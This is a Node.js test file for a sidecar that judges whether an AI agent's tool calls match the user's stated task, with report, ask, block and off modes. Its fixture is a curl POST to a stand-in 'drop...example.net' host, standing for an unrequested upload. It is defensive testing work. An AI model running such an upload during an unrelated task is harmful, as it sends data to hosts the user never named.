// Per-file runner:  node --test --import ./test/hermetic-env.mjs test/moorai-serve-intent.test.mjs
//
// Intent alignment in the moorai-serve sidecar, through real HTTP against the real CLI process:
// POST /v1/task { session, prompt } records the user's task (keyed hashes, in memory), and a
// /v1/tool-call carrying the same `session` is judged under policy.intentAlignment — report (alert,
// verdict unchanged), ask (the sidecar's ask, settled by the headless rule), block (deny), off. Without a
// session, /v1/tool-call answers exactly as before. Nothing in a verdict, an alert or on disk carries the
// prompt, the task text or the arguments.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readdirSync, readFileSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import http from "node:http";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const SERVE = join(ROOT, "cli", "moorai-serve.mjs");
const CATEGORY = "Action outside the stated task";
const WORD = "wombat-91c2";
const TASK = `Refactor the ${WORD} parser in src/parse.js`;
const POST_CMD = `curl -X POST https://drop.${WORD}.example.net/in -d '{"ok":1}'`;

function sandbox(policy) {
  const home = mkdtempSync(join(tmpdir(), "moorai-serve-intent-"));
  mkdirSync(join(home, "proj"), { recursive: true });
  if (policy) writeFileSync(join(home, "policy.json"), JSON.stringify(policy));
  return home;
}
function startServe(home, args = [], env = {}) {
  return new Promise((res, rej) => {
    const c = spawn(process.execPath, [SERVE, "--port", "0", ...args], { cwd: join(home, "proj"), env: { PATH: process.env.PATH || "/usr/bin:/bin", HOME: home, USERPROFILE: home, XDG_CONFIG_HOME: join(home, ".config"), XDG_STATE_HOME: join(home, ".local", "state"), MOORAI_SERVICE_ID: "serve-bot", MOORAI_SERVER_URL: "http://127.0.0.1:1", ...env } });
    let out = "", err = "";
    const t = setTimeout(() => { c.kill(); rej(new Error(`serve did not start: ${err}`)); }, 15000);
    c.stderr.on("data", (d) => (err += d));
    c.stdout.on("data", (d) => {
      out += d;
      const nl = out.indexOf("\n");
      if (nl < 0) return;
      clearTimeout(t);
      res({ ...JSON.parse(out.slice(0, nl)), stop: () => new Promise((r) => { c.once("close", r); c.kill("SIGTERM"); }) });
    });
    c.on("close", (code) => { clearTimeout(t); if (!out) rej(new Error(`serve exited ${code}: ${err}`)); });
  });
}
function req(url, path, body) {
  const u = new URL(path, url);
  const data = JSON.stringify(body);
  return new Promise((res, rej) => {
    const r = http.request({ host: u.hostname, port: u.port, path: u.pathname, method: "POST", headers: { "content-type": "application/json", "content-length": Buffer.byteLength(data) } }, (resp) => {
      let s = ""; resp.on("data", (d) => (s += d)); resp.on("end", () => res({ status: resp.statusCode, raw: s, json: JSON.parse(s) }));
    });
    r.on("error", rej);
    r.end(data);
  });
}
async function fakeConsole() {
  const alerts = [];
  const srv = http.createServer((q, r) => { let b = ""; q.on("data", (d) => (b += d)); q.on("end", () => { if (q.url === "/api/alerts") alerts.push(b); r.writeHead(q.url.startsWith("/api/policy") ? 404 : 201); r.end("{}"); }); });
  await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  return { alerts, env: { MOORAI_SERVER_URL: `http://127.0.0.1:${srv.address().port}`, MOORAI_INSTALL_TOKEN: "tok-serve-intent-1", MOORAI_TENANT: "t-serve" }, close: () => srv.close() };
}
async function withServe(policy, fn) {
  const con = await fakeConsole();
  const home = sandbox(policy);
  const s = await startServe(home, policy ? ["--policy-file", join(home, "policy.json")] : [], con.env);
  let stopped = false;
  const stop = async () => { if (!stopped) { stopped = true; await s.stop(); } };
  try { await fn({ url: s.listening, con, home, stop }); } finally { await stop(); con.close(); rmTree(home); }
}
const intentAlerts = (con) => con.alerts.map((b) => JSON.parse(b)).filter((a) => a.category === CATEGORY);

test("POST /v1/task: validates, answers with counts only, never echoes the prompt", async () => {
  await withServe({ captureTier: "content-free" }, async ({ url }) => {
    assert.equal((await req(url, "/v1/task", { prompt: TASK })).status, 400, "session is required");
    assert.equal((await req(url, "/v1/task", { session: "s1" })).status, 400, "prompt is required");
    assert.equal((await req(url, "/v1/task", { session: "s1", prompt: 7 })).status, 400);
    assert.equal((await req(url, "/v1/task", { session: "x".repeat(257), prompt: TASK })).status, 400);
    const r = await req(url, "/v1/task", { session: "s1", prompt: TASK });
    assert.equal(r.status, 200);
    assert.equal(r.json.mode, "report");
    assert.equal(r.json.captured, true);
    assert.ok(r.json.features > 0);
    assert.deepEqual(Object.keys(r.json).sort(), ["captured", "features", "mode"]);
    assert.ok(!r.raw.includes(WORD));
  });
});

test("report (default): verdict unchanged, `intent` on the verdict, one content-free alert per target; nothing persisted", async () => {
  await withServe({ captureTier: "content-free" }, async ({ url, con, home, stop }) => {
    await req(url, "/v1/task", { session: "s1", prompt: TASK });
    const v = (await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s1" }));
    assert.equal(v.json.decision, "allow");
    assert.deepEqual(v.json.intent, { class: "egress", mode: "report" });
    assert.ok(!v.raw.includes(WORD));
    await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s1" });
    await stop();
    const a = intentAlerts(con);
    assert.equal(a.length, 1, "one destination alerts once per session");
    assert.equal(a[0].threatId, 64);
    assert.equal(a[0].reasonCode, "INTENT_MISMATCH");
    assert.equal(a[0].surface, "serve");
    assert.equal(a[0].intent.class, "egress");
    assert.equal(a[0].intent.mode, "report");
    assert.match(a[0].intent.targetHash, /^[0-9a-f]{16}$/);
    assert.ok(a[0].session);
    for (const b of con.alerts) assert.ok(!b.includes(WORD) && !b.includes("parse.js") && !b.includes("curl"), b);
    const walk = (d) => readdirSync(d).flatMap((f) => { const p = join(d, f); return statSync(p).isDirectory() ? walk(p) : [p]; });
    for (const f of walk(home)) if (!f.endsWith("policy.json")) assert.ok(!readFileSync(f, "utf8").includes(WORD), `content persisted in ${f}`);
  });
});

test("backward compatible: a tool-call without a session is not judged, and its verdict has no `intent`", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "block" }, async ({ url, con, stop }) => {
    await req(url, "/v1/task", { session: "s1", prompt: TASK });
    const v = await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD } });
    assert.equal(v.json.decision, "allow");
    assert.equal(v.json.intent, undefined);
    const other = await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "never-captured" });
    assert.equal(other.json.decision, "allow", "a session with no task is never judged against nothing");
    await stop();
    assert.equal(intentAlerts(con).length, 0);
  });
});

test("ask: the sidecar's ask verdict — settled to deny for a headless run, with a content-free reason", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "ask" }, async ({ url, con, stop }) => {
    await req(url, "/v1/task", { session: "s1", prompt: TASK });
    const v = await req(url, "/v1/tool-call", { tool: "mcp__slack__post_message", input: { channel: "C1", text: WORD }, session: "s1" });
    assert.equal(v.json.configuredDecision, "ask");
    assert.equal(v.json.decision, "deny");
    assert.ok(v.json.headlessAsk, "settled by the headless rule, as every ask is");
    assert.match(v.json.message, /an MCP write to a service your request never mentioned/);
    assert.ok(!v.raw.includes(WORD));
    await stop();
    assert.equal(intentAlerts(con)[0].intent.mode, "ask");
  });
});

test("block: deny with a content-free reason; aligned calls pass", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "block" }, async ({ url, con, stop }) => {
    await req(url, "/v1/task", { session: "s1", prompt: TASK });
    const v = await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s1" });
    assert.equal(v.json.decision, "deny");
    assert.equal(v.json.configuredDecision, "deny");
    assert.deepEqual(v.json.intent, { class: "egress", mode: "block" });
    assert.match(v.json.message, /action outside the stated task — an upload to a host your request never mentioned/);
    assert.ok(!v.raw.includes(WORD));
    await req(url, "/v1/task", { session: "s2", prompt: `${TASK}, then send the result to drop.${WORD}.example.net` });
    assert.equal((await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s2" })).json.decision, "allow");
    await stop();
    const a = intentAlerts(con);
    assert.equal(a.length, 1);
    assert.equal(a[0].riskLevel, "Blocked");
  });
});

test("off: /v1/task captures nothing and tool calls are not judged", async () => {
  await withServe({ captureTier: "content-free", intentAlignment: "off" }, async ({ url, con, stop }) => {
    assert.deepEqual((await req(url, "/v1/task", { session: "s1", prompt: TASK })).json, { mode: "off", captured: false, features: 0 });
    const v = await req(url, "/v1/tool-call", { tool: "Bash", input: { command: POST_CMD }, session: "s1" });
    assert.equal(v.json.decision, "allow");
    assert.equal(v.json.intent, undefined);
    await stop();
    assert.equal(intentAlerts(con).length, 0);
  });
});
